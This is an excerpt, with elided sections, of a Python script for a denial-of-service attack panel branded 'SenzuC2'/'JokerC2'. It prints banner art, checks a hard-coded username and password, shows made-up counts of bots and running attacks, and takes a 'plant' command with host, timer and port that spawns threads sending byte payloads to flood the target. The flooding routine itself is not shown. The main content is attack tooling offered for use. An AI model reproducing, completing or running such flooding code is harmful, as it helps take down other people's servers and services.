...
sys.stdout.write("\x1b]2;[-] SenzuC2 | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [Senzu] | Backup Server : [2] | Username : SenzuC2\x07".format (prot))
...
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
             \033[93m            >> \033[96mPrivate Tools - \033[32mJokerC2\033[93m<< 
            \033[97m
   ███                                                                                
  █   █
\033[97m  █   █                      \033[93m Author : Senzu ΣX
\033[97m█████████               ██   \033[93m YouTube : Senzu ΣX
\033[97m█████████              █  █  \033[93m Team : ΣXCUTED ++
\033[97m███   ███ ██████████████  █    \033[35m JOK\033[32mER 🤡
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m      
    
""")
username = str(input("\033[33m[SenzuC2] \033[93mUsername:"))
password = str(input("\033[33m[JokerC2] \033[93mPassword:"))
if password == "JokerC2" and username == "Senzu":
...
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
"""
attacked =  """\033[97m[INFO] You Have Successfully Attack!!"""
...
def main():
    ...
    while True:
        ...
        sys.stdout.write("\x1b]2;[-]SenzuC2 | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [SenzuC2] | Backup Server : [2] | Username : admin\x07".format (powerran))
        sin = input("\033[95m[\033[97mSenzu\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
        ...
        if sinput == "plant":
            ...
            try:
                if running >= 9000000:
                    ...
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x10\x20\x10\x30\x16\x00\x17\x00\x10\x16\x20\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    print(attacked)
            ...
            try:
                if running >= 9000000:
                    ...
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x10\x20\x00\x20\x17\x30\x00\x16\x00\x16\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    print(attacked)
            except ValueError:
                main()
